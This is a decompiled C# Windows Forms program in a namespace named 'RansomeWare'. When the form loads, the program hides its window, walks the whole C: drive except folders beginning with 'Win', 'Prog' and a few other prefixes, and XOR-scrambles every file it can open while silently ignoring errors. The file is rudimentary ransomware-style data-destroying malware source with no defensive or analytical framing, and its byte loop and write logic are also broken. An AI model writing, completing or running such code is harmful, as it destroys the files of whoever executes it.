using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace RansomeWare;

public class Form1 : Form
{
	private IContainer components;

	private Label label1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		label1_Click(null, null);
		((Control)this).Show();
	}

	private void SaveFile(FileInfo nf)
	{
		FileStream fileStream = new FileStream(nf.FullName, FileMode.Open, FileAccess.ReadWrite);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, (int)fileStream.Length);
		for (int i = 1; i <= array.Length; i++)
		{
			array[i] ^= 2;
		}
		fileStream.Write(array, 0, array.Length);
		fileStream.Close();
	}

	private int Project(DirectoryInfo di)
	{
		int result = 0;
		FileInfo[] files = di.GetFiles();
		foreach (FileInfo nf in files)
		{
			try
			{
				SaveFile(nf);
			}
			catch (Exception)
			{
			}
		}
		DirectoryInfo[] directories = di.GetDirectories();
		foreach (DirectoryInfo directoryInfo in directories)
		{
			try
			{
				if (!(directoryInfo.Name.Substring(0, 3) == "Win") && !(directoryInfo.Name.Substring(0, 4) == "Prog") && !(directoryInfo.Name.Substring(0, 1) == " ") && !(directoryInfo.Name.Substring(0, 1) == "Z") && !(directoryInfo.Name.Substring(0, 1) == "3"))
				{
					Project(directoryInfo);
				}
			}
			catch (Exception)
			{
			}
		}
		return result;
	}

	private void label1_Click(object sender, EventArgs e)
	{
		DirectoryInfo di = new DirectoryInfo("C:\\");
		Project(di);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Segoe UI Light", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(43, 6));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(195, 40));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Encrypt by me");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(533, 48));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(2));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Description");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
